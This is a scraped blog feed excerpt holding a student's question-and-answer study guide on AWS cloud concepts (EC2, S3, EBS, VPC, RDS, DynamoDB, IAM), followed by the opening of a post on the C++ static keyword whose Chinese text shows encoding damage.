&lt;p>True or False: Deploying your enterprise applications in the AWS cloud is cheaper than running your own data center. Explain your answer.
&lt;strong>True&lt;/strong>. If you running your applications in your own data center, the first thing is you must build a data center, you need to build the basic infrastructure(Power system, engine room etc.) and you need to buy lots of servers and network devices. Moreover, you must employ people to help you to maintain and manage the datacenter. But, for AWS, you just pay for the resource that you truly want and there are lots of purchases options to use AWS service.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe three advantages and one disadvantage of running enterprise applications in the commercial cloud as compared to running your own data center.&lt;/p>
&lt;ul>
&lt;li>Advantages: Cheaper, scalable, no labor maintain&lt;/li>
&lt;li>Disadvantage: Risk of AWS service down&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Computing&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>What is the AWS Marketplace?
AWS Marketplace is an online store where you can buy or sell software that runs on Amazon Web Services.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is a hypervisor and what is its main function? Do you have access to the hypervisor layer in AWS? Explain your answer.&lt;/p>
&lt;ul>
&lt;li>A hypervisor is a function which abstracts and isolates operating systems and applications from the underlying computer hardware. This abstraction allows the underlying host machine hardware to independently operate one or more virtual machines as guests, allowing multiple guest VMs to effectively share the system&amp;rsquo;s physical compute resources, such as processor cycles, memory space, network bandwidth and so on.&lt;/li>
&lt;li>The main function of hypervisor is to manage the virtual machines.&lt;/li>
&lt;li>No, you donât need to access the hypervisor layer, you just need to use EC2 instance to develop your own application, and AWS will help you to manage the resource that your virtual machines needed.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>What is an Instance?&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Amazon instances are virtualized servers or virtual computing environments in amazonâs data centers.&lt;/p>
&lt;ol>
&lt;li>Draw the EC2 instance life cycle diagram. See
&lt;a href="https://www.google.com/search?q=ec2&amp;#43;instance&amp;#43;lifecycle&amp;amp;rlz=1C1GCEA_enUS785US785&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;sa=X&amp;amp;ved=0ahUKEwiNg87g9LfdAhVSzlMKHQAdDYwQ_AUICigB&amp;amp;biw=1361&amp;amp;bih=926#imgrc=CXUrONSjwds2NM:" target="_blank" rel="noopener">here (Links to an external site.)Links to an external site.&lt;/a>&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/images/instance_lifecycle.png" alt="Image result for ec2 instance lifecycle">&lt;/p>
&lt;ol start="6">
&lt;li>
&lt;p>Explain what âPay as you Goâ means.
âPay as you Goâ means you just pay for the resources that you truly used, and if you do not use those resources, you do not need to pay. Like electric power or water, when you use it, then you pay for it.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List four AWS EC2 Purchasing Options.
On-demand instance, Reserved instance, Spot instance, Dedicated Hosts.
&lt;del>Scheduled instance, Dedicated instance,&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Describe at least three differences between On-Demand purchasing and Reserved Instance purchasing. (Between On-Demand purchasing and Spot Instance purchasing, between Reserved purchasing and Scheduled purchasing.)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>On-Demand Instances: 1. Computer capacity by the hours &amp;amp; second. 2. It has short-term, spiky o unprecdictable workload. Low cost and flexibility.&lt;/li>
&lt;li>Reserved Instance: 1. Purchasing need upfront payment, steady-state workload, can get 50%-75% lower than on-demand rate. 2. Overall cost is lower. 3. Predictability ensures compute capacity is available when needed.&lt;/li>
&lt;li>Spot Instances: 1.Bid for unused Amazon EC2 capacity. 2.The price based on supply and demand. 3.Instances can be lost if youâre outbid, 4. Instances can be interrupted if the Spot price exceeds the maximum. 5.Large scale, dynamic workload.&lt;/li>
&lt;li>Dedicated Hosts: 1.Save money on licensing costs. 2.Help meet compliance and regulatory requirements.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>For what kind of workload would you prefer on-Demand pricing? Spot pricing? Reserved Instance pricing? Scheduled Instance pricing?&lt;/p>
&lt;ul>
&lt;li>On-demand: short term, spiky or unpredicted workload;&lt;/li>
&lt;li>Reserved: consistent, heavy workload. Steady state or preictable usage workloads.&lt;/li>
&lt;li>Spot: Applications with flexible start and end times.&lt;/li>
&lt;li>Scheduled: Usage and licensing tracking.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>True or False: If you launch an instance using Spot pricing and it is terminated by AWS in 30 minutes then you are charged for the full hour.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>False. The minimum is 60 seconds. But it are billed on one-second increments.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>True or False: If you launch an instance using Spot pricing and you terminate it in 30 seconds then you are charged for the full minute.
&lt;code>True&lt;/code>. The minimum of 60 second.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: An AMI includes a template for the root volume, launch permission that control which AWS accounts can use the AMI, and a block device mapping that specifies the volumes to attach to the instance when it is launched.
&lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Name four families of EC2 instances.&lt;/p>
&lt;ul>
&lt;li>General purpouse: t2, m3, m4&lt;/li>
&lt;li>Compute-Optimized: c4,c3&lt;/li>
&lt;li>Mermory-Optimized: r3&lt;/li>
&lt;li>GPU instance: g2&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>What is Instance Metadata? Give an example.&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Instance Metadata is data about the instance, can be used to configure and manage a running instance. For example, aim-id, ami-launch-index, private or public IP address etc.&lt;/p>
&lt;ol start="5">
&lt;li>&lt;strong>What is Instance User Data? Give an example.&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>Instance User data is a data can be passed to the instance at launch and can be used to perform common automated configuration scripts. For example:&lt;/p>
&lt;pre>&lt;code class="language-bash">#!/bin/bash
yum update -y
yum install -y httpd24 php56 mysql55-server php56-mysqlnd
service httpd start
chkconfig httpd on
&lt;/code>&lt;/pre>
&lt;ol start="6">
&lt;li>&lt;strong>Explain the concept of bootstrapping an instance.&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>It creates an application context that provides the runtime context for an application.&lt;/p>
&lt;ol start="7">
&lt;li>True or False: You are able to reboot any type of instance.
&lt;code>True&lt;/code>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Storage&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Describe three differences between Amazon EBS and Amazon EC2 Instance Store&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>EBS: Data stored in EBS can persist independently of the life of instance. Storage is &lt;code>persistent&lt;/code>. Used to store higher level durable data.which can be mounted as a device to an Amazon EC2 instance. &lt;code>Mountable storage&lt;/code>, Amazon EBS can only be mounted to an Amazon EC2 instance within the &lt;code>same Availability Zone&lt;/code>.&lt;/li>
&lt;li>EC2 Instance Store: Data stored in EC2 Instance Store can persist only as long as the instance alive. Storage is ephemeral. Used to store temporary data.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>True or False: Every type of instance can use EC2 Instance Store. Explain your answer. (This is a trick question).&lt;/strong>
&lt;code>False: &lt;/code>Use the local instance store only for temporary data.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>What is the difference between ephemeral and persistent storage? Which type is EBS? Which type is S2? Which type is Instance Store?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Persistent storage is just like a data is stored in hard disk, and will persist in this disk.&lt;/li>
&lt;li>The Ephemeral storage means the stored data always a temporary data, like cache, buffers etc. When the instance is unlived, this data will be deleted.&lt;/li>
&lt;li>EBS: persistent storage, S3: persistent storage , Instance Store: ephemeral storag&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe the difference between Block Storage and Object Storage. Describe what happens if you change a single character in Block Storage versus what happens if you change a single character in Object Storage.&lt;/p>
&lt;ul>
&lt;li>Block Storage: File is split and stored in fixed sized blocks; Capacity can be increased by adding more nodes; Suitable for applications which require high IOPS, database, transactional data.&lt;/li>
&lt;li>Object Storage: Store virtually unlimited files; Maintain file revisions; HTTP(S) based interface; Files are distributed in different physical nodes.(from Google)&lt;/li>
&lt;li>This means that you must write whole objects at a time. If you change one small part of a file, you must rewrite the entire file in order to commit the change to Amazon S3.(U2page77)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>True or false: S3 is a Block Storage system.
&lt;code>False&lt;/code>. S3 is cloud object storage for the Internet where files are reachable via a restful URL.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or false: EBS is an Object Storage system.
&lt;code>False&lt;/code>. EBS provides block-level storage volumes for use with Amazon EC2 instances.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or false: S3 is a key-value object store with unlimited storage capacity. Explain your answer. &lt;code>True&lt;/code>
False: An object is composed of a file and any metadata that describes that file. S3 can store an unlimited number of objects in a bucket. There is a 100-bucket limit per account and the size of an object can be up to 5 TB, and there is no limit to the size of a bucket.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is the largest size object that can be stored in S3?
&lt;code>5TB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>EBS can be compared to what real hardware device?
&lt;code>Hard disk(Hard drive)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>For what type of workload would you prefer S3?
One very common use for Amazon S3 is storage and distribution of static web content and media
Q: The data need to be accessed by internet.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: You can back up EBS to S3. Explain your answer.
&lt;code>False&lt;/code>, we only can backup EBS snapshot to S3&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is an EBS Snapshot?
An EBS snapshot is a point-in-time backup of your EBS volume. It is a âcopyâ of the data on your EBS volume. Snapshots are incremental backups, which means that only the blocks on the device that have changed after your most recent snapshot are saved&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Describe the EBS volume lifecycle.&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-CPSC6440-CloudComputing-basic-concepts/2018-09-24-22-06-36.png" alt="">&lt;/p>
&lt;ol start="14">
&lt;li>
&lt;p>&lt;strong>What are provisioned IOPS?&lt;/strong>
Provisioned IOPS are a new EBS volume type designed to deliver predictable, high performance for I/O intensive workloads, such as database applications, that rely on consistent and fast response times&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe three use cases for EBS.
OS: use for root/boot volume, secondary volume
Databases: scales with your performance needs
Applications: install and persist any application&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe the difference between Amazon S3 Standard and Amazon S3 Standard - Infrequent Access.&lt;/p>
&lt;ul>
&lt;li>Amazon S3 Standard, for general-purpose storage of frequently accessed data&lt;/li>
&lt;li>Amazon S3 Standard-Infrequent Access (Standard-IA), for long-lived, but less frequently accessed data&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Data retrieval from Amazon Glacier will take _____ to begin:&lt;/p>
&lt;ol>
&lt;li>10 minutes&lt;/li>
&lt;li>1 hour&lt;/li>
&lt;li>&lt;code>3-5 hours&lt;/code>&lt;/li>
&lt;li>1-3 hours&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>What does it mean to be fault tolerant?
Fault-tolerance defines the ability for a system to remain in operation even if some of the components used to build the system fail.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What does it mean to be highly available?
High availability refers to systems that are durable and likely to operate continuously without failure for a long time.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is the difference between availability and durability of data?&lt;/p>
&lt;ul>
&lt;li>Durability means data integrity, data is not lost etc.&lt;/li>
&lt;li>Availability means that it is &amp;ldquo;available to access&amp;rdquo;&lt;/li>
&lt;li>Data can be unavailable to access but the data will still be intact and not lost if there is high durability.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Suppose that the probability that a storage device fails in a year is 1%. Suppose that you store your data redundantly on two independent devices with the same failure rate. What is the probability that you will lose your data in a year? Assuming no use of error correcting codes, on how many devices do you have to redundantly store your data so that the probability of losing it is less than .0000000001%?
&lt;code>0.01%, 6&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>How much time will an application be unavailable in a year if it has 99.999999999% availability?
&lt;code>0.000315s 0.019&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Networking&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>True or False: VPCs are logically isolated from other virtual networks.
&lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>A VPC resides in a single:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Availability Zone&lt;/li>
&lt;li>Edge Location&lt;/li>
&lt;li>&lt;strong>Region&lt;/strong>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>What is a data center? An Availability Zone? A Region? Give two examples of AWS regions.&lt;/p>
&lt;ul>
&lt;li>Data center: A data center is a facility used to house computer systems and associated components, such as telecommunications and storage systems.&lt;/li>
&lt;li>Availability Zone: AZs consist of data centers clustered in a region.&lt;/li>
&lt;li>Region: Geographic locations that contain multiple Availability Zones.&lt;/li>
&lt;li>Two examples: US East: N. Virginia, Ohio; US West: N. California, Oregon; China: Beijing&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>How do Availability Zones in the same Region differ?
Availability Zones are always referenced by their Code Name, which is defined by the AZs Region Code Name that the AZ belongs to, followed by a letter.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is an Edge location?
An edge location is where end users access services located on AWS platform.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: There are many more Regions than Edge locations in AWS. Explain your answer.
&lt;code>False:&lt;/code> 74+ edge locations while 16 regions&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: Data transferred between AZs travel on private high-speed network links.
&lt;code>True: &lt;/code>Each AZ is isolated, but the AZs in a region are connected through low-latency links.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: Data transferred between Regions travel on the public Internet.
&lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: VPCs cannot include resources in more than one Availability Zone.
&lt;code>False: &lt;/code>each subnet must reside entirely within one AZ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: VPC provides various feature to provide security, including Security Groups, Network Access Control Lists, and Key Pairs.
&lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Which of the following statements regarding Amazon VPC are True? 1,2,4&lt;/p>
&lt;ol>
&lt;li>&lt;code>A private subnet should be used for resources that wonât be accessible over the Internet&lt;/code>&lt;/li>
&lt;li>&lt;code>Each subnet must reside entirely within one Availability Zone&lt;/code>&lt;/li>
&lt;li>A public subnet should be used for resources that wonât be accessible over the Internet&lt;/li>
&lt;li>&lt;code>A subnet defines a range of IP addresses in your VPC&lt;/code>&lt;/li>
&lt;li>Subnets can span Availability Zones&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>Each Availability Zone in an AWS Region is separated by:&lt;/p>
&lt;ol>
&lt;li>&lt;code>At least 10s of miles&lt;/code>&lt;/li>
&lt;li>At most 10s of miles&lt;/li>
&lt;li>Exactly 10 miles&lt;/li>
&lt;li>At least 100 miles&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>Regions consist of at least __ Availability Zones:&lt;/p>
&lt;ol>
&lt;li>1&lt;/li>
&lt;li>6&lt;/li>
&lt;li>&lt;code>2&lt;/code>&lt;/li>
&lt;li>10&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>True or False: A Security Group is within a single VPC. &lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Give an example of a network rule you might assign in a Security Group.
HTTP(80), HTTPS(443)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Security Groups control both inbound and outbound traffic at the _____ level.&lt;/p>
&lt;ol>
&lt;li>Subnet&lt;/li>
&lt;li>VPC&lt;/li>
&lt;li>&lt;code>Instance&lt;/code>&lt;/li>
&lt;li>Availability Zone&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Database&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Describe three differences between an AWS managed service and an unmanaged service.&lt;/p>
&lt;ul>
&lt;li>Managed service offers support for every problem or task, emergency or routine versus unmanaged services offer no routine support.&lt;/li>
&lt;li>Managed service is more expensive as there is constant management versus unmanaged
services are cheaper as you are responsible for everything.&lt;/li>
&lt;li>Managed hosting is far less work and requires little expertise. If something goes wrong and you&amp;rsquo;re stuck, you can call on your host to give you a hand versus Unmanaged hosting gives you complete control: sole access and total freedom.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>__________ are the basic building blocks of Amazon RDS.
DB instances&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>True or False: A DB Instance is an isolated database environment in the cloud.&lt;/strong>
True: A DB instance is an isolated database environment running in the cloud. It is the basic building block of Amazon RDS.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Name four databases supported by AWS RDS.
MySQL, MariaDB, Microsoft SQL Server, Oracle, PostgreSQL&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe three differences between using a managed RDS and building your own database on EC2.
Managed RDS provide cost-efficient and resizable capacity while managing time-consuming database administration task. RDS automatically patches the database software and backs up the database. Itâs flexible. It accesses to the full capabilities of databases.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>In general, SQL databases have _____ scaling and NoSQL databases have _____ scaling.
&lt;code>vertical&lt;/code>
&lt;code>horizontal&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe the difference between vertical scaling and horizontal scaling.
Horizontal scaling means that you scale by adding more machines into your pool of resources whereas vertical scaling means that you scale by adding more power (CPU, RAM) to an existing machine.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is the main limitation to vertical scaling? That is, when can you no longer scale vertically?
In Scaling Up (also known as Vertical Scaling) the limitation is hardware related in a very specific way: how much memory, disk, and processor a single server can supportâ¦
Vertical scaling is limited to the capacity of a single machine.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>What is the main limitation to horizontal scaling? That is, when can you no longer scale horizontally?&lt;/strong>
In theory, horizontal scalability is only limited by how many entities can be connected successfully.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Give three examples of SQL-like statements.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-sql">CREATE TABLE table_name (column_name column_type);
Select * FROM table_name;
INSERT INTO table_name (field1, field2,...) VALUES (value1, value2,...);
&lt;/code>&lt;/pre>
&lt;ol start="11">
&lt;li>Give an example of datasqu that might be in a NoSQL database.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-CPSC6440-CloudComputing-basic-concepts/2018-09-24-22-07-18.png" alt="">&lt;/p>
&lt;ol start="12">
&lt;li>
&lt;p>True or False: You cannot use SQL to query a NoSQL database. Explain your answer.
&lt;code>False&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: You can query and scan DynamoDB to retrieve data. &lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>For what type of workload would you prefer DynamoDB?
New web-scale applications and larger number of small read and write&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True/False: You should utilize Amazon DynamoDB if your application requires complex queries, joins, and updates.
&lt;code>False&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True or False: You should utilize Amazon DynamoDB if your data is unstructured and you require fast I/O.
&lt;code>True&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Which of the following allows unlimited storage:&lt;/p>
&lt;ol>
&lt;li>&lt;code>S3&lt;/code>&lt;/li>
&lt;li>EBS&lt;/li>
&lt;li>Instance Store&lt;/li>
&lt;li>RDS&lt;/li>
&lt;li>&lt;code>DynamoDB&lt;/code>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Describe eventually consistent reads and strongly consistent reads. Which AWS service(s) provide eventually consistent reads, and under what conditions? (Move to exam 2)&lt;/strong>
service(s) provide eventually consistent reads, and under what conditions?&lt;/p>
&lt;ul>
&lt;li>Eventually Consistent Reads: When you read data from a DynamoDB table, the response might not reflect the results of a recently completed write operation. The response might include some stale data. If you repeat your read request after a short time, the response should return the latest data.&lt;/li>
&lt;li>Strongly Consistent Reads: When you request a strongly consistent read, DynamoDB returns a response with the most up-to-date data, reflecting the updates from all prior write operations that were successful. A strongly consistent read might not be available if there is a network delay or outage.&lt;/li>
&lt;li>By default (DynamoDB)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Why would we not always use strongly consistent reads in a distributed system like AWS?
A strongly consistent read might not be available if there is a network delay or outage.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;em>Describe the similarity and difference between Secondary DB and Read Replica DB&lt;/em>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Scalability&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Name the two types of load balancers.
Classic load balancer, Application load balancer, Network load balancer.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>You can create Auto Scaling Group scaling policies that utilize _____ to determine when your Auto Scaling group should scale out or scale in.
1. VPC
2. S3
3. &lt;code>CloudWatch alarms&lt;/code>
4. Instance Store&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List three things that you can specify when you create a Launch Configuration.&lt;/p>
&lt;ul>
&lt;li>A key pair&lt;/li>
&lt;li>Security group&lt;/li>
&lt;li>A block device mapping
The ID of the Amazon Machine Image (AMI), the instance type, a key pair, one or more security groups, and a block device mapping&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>List three benefits of utilizing Auto Scaling within your application.&lt;/p>
&lt;ul>
&lt;li>Better fault tolerance&lt;/li>
&lt;li>Better availability&lt;/li>
&lt;li>Better cost management&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>True or False: An Auto Scaling group is a collection of EC2 Instances that share the same characteristics.
&lt;code>True&lt;/code>: An Auto Scaling group contains a collection of EC2 instances that share similar characteristics and are treated as a logical grouping for the purposes of instance scaling and management.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Explain the concept of bootstrapping an instance.
It creates an application context that provides the runtime context for an application.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>AWS Security&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>What does âSecurity of the Cloudâ mean? Describe three aspects of security of the cloud.&lt;/strong>
The policies and mechanisms AWS use to protect the cloud itself. Compute, storage, database, networking.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>What does âSecurity in the Cloudâ mean? Describe three aspects of security in the cloud.&lt;/strong>
The AWS service you utilize to run your workloads. Operating system, customer application and content, IAM&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Define authentication. Define authorization. How are they different?&lt;/p>
&lt;ul>
&lt;li>Authentication is the process of verifying who you are. When you log on to a PC with a username and password you are authenticating.&lt;/li>
&lt;li>Authorization is the process of verifying that you have access to something. Gaining access to a resource (e.g. directory on a hard disk) because the permissions configured on it allow you access is authorization.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>List the three IAM constructs that an IAM Policy can be assigned to.
IAM users, IAM groups, IAM role.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Explain what an IAM User is.
An IAM user is an entity that you create in AWS to represent the person or service that uses it to interact with AWS.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Explain a difference between role-based authorization and user-based authorization.
Roles-based authorization is used to group users into groups (roles) and then set permissions on the role rather than on individual users.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>True/False: All IAM permissions in AWS are implicitly allowed by default. &lt;code>False&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Draw the IAM permissions flow chart.&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-CPSC6440-CloudComputing-basic-concepts/2018-09-24-22-07-58.png" alt="">&lt;/p>
&lt;ol start="9">
&lt;li>
&lt;p>Suppose you create a policy for a user to Allow access to a table called âTable1â. In your same policy you Deny access to any table that is Not âTable1â. Then in the same policy you Allow access to âTable2â. Can this user access âTable2â? Why or why not?
&lt;strong>Answer:&lt;/strong> The user can&amp;rsquo;t access table 2 because we can&amp;rsquo;t rewrite or overwrite the previlieges already defined. If the user needs to access it he needs to define it before its access is set as deny&lt;/p>
&lt;/li>
&lt;li>
&lt;p>IAM Policies are written in _____.&lt;/p>
&lt;ol>
&lt;li>&lt;code>JSON&lt;/code>&lt;/li>
&lt;li>CSV&lt;/li>
&lt;li>XML&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>True or False: IAM is appropriate for OS and application authentication.
&lt;code>False&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>C++ Staticå³é®å­çç¨æ³è¯´æ</title><link>http://www.guozet.me/post/C++-Static-keyword/</link><pubDate>Tue, 18 Sep 2018 14:00:00 +0000</pubDate><guid>http://www.guozet.me/post/C++-Static-keyword/</guid><description>&lt;h1 id="cä¸­staticå³é®å­çåºç¨">C++ä¸­Staticå³é®å­çåºç¨&lt;/h1>
&lt;p>ç±äºC++æ¯ä¸ç§æºèªäºCçè¯­è¨ï¼æä»¥æä»¬éè¦ååæStaticå¨Cè¯­è¨ä¸­çåºç¨ãå¨&lt;code>Cè¯­è¨&lt;/code>ä¸­, ä½¿ç¨Staticå³é®å­çä½ç¨æ¯:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¨äºå½æ°åé¨ä¿®é¥°åéï¼å³å½æ°åçéæåéãè¿ç§åéççå­æé¿äºè¯¥å½æ°ï¼ä½¿å¾å½æ°å·æä¸å®çâç¶æâãä½¿ç¨éæåéçå½æ°ä¸è¬æ¯ä¸å¯éå¥çï¼ä¹ä¸æ¯çº¿ç¨å®å¨çï¼æ¯å¦strtok(3)ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨å¨æä»¶çº§å«ï¼å½æ°ä½ä¹å¤ï¼ï¼ä¿®é¥°åéæå½æ°ï¼è¡¨ç¤ºè¯¥åéæå½æ°åªå¨æ¬æä»¶å¯è§ï¼å¶ä»æä»¶çä¸å°ä¹è®¿é®ä¸å°è¯¥åéæå½æ°ãä¸ä¸çè¯´æ³å«âå·æinternal linkageâï¼ç®è¨ä¹ï¼ä¸æ´é²ç»å«çtranslation unitï¼ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>å¨C++ä¸­å¼åºçCè¯­è¨æ²¡æçç±»ï¼æä»¥æä»¬å°±éè¦åæå¨C++çç±»éé¢ä½¿ç¨&lt;code>Staticå³é®å­ç&lt;/code>ä½ç¨ä¸æ¹å¼ã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¨äº&lt;code>ä¿®é¥°ç±»çæ°æ®æå&lt;/code>ï¼å³æè°âéææåâãè¿ç§æ°æ®æåççå­æå¤§äºclassçå¯¹è±¡ï¼å®ä¾/instanceï¼ãéææ°æ®æåæ¯æ¯ä¸ªclassæä¸ä»½ï¼æ®éæ°æ®æåæ¯æ¯ä¸ªinstance æä¸ä»½ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨äº&lt;code>ä¿®é¥°classçæåå½æ°&lt;/code>ï¼å³æè°âéææåå½æ°âãè¿ç§æåå½æ°&lt;code>åªè½è®¿é®éææååå¶ä»éæç¨åå½æ°&lt;/code>ï¼ä¸è½è®¿é®ééææååééææåå½æ°ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="c-ç±»ä¸­çstaticæ°æ®æåçåå§ååç¹ç¹">C++ ç±»ä¸­çstaticæ°æ®æåçåå§ååç¹ç¹&lt;/h2>
&lt;pre>&lt;code class="language-cpp">class CTypeInit{
public:
CTypeInit( int c):m_c(c),m_ra(c){ }
private:
int m_a; //éè¿åå§ååè¡¨åå§åï¼æèæé å½æ°åå§å
/*å¼ç¨*/
int &amp;amp;m_ra; //åªè½éè¿åå§ååè¡¨åå§å
/*éæåé*/
static int m_b;
/*å¸¸é*/
const int m_c;
/*éææ´åå¸¸é*/
static const int m_d;
/*éæéæ´åå¸¸é*/
static const double m_e;
};
//éææååéï¼å¿é¡»å¨ç±»å¤åå§å,ä¸è¦å»æstaticå³é®å­
int CTypeInit::m_b = 6;
const int CTypeInit::m_d = 6;
const double CTypeInit::m_e = 3.1415926;
int main()
{
CTypeInit obT(2);
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>åä¸ºä¸é¢å ç§æåµ&lt;/p>
&lt;h4 id="éæåé">éæåé&lt;/h4>
&lt;p>&lt;code>static int m_b;&lt;/code>&lt;/p>
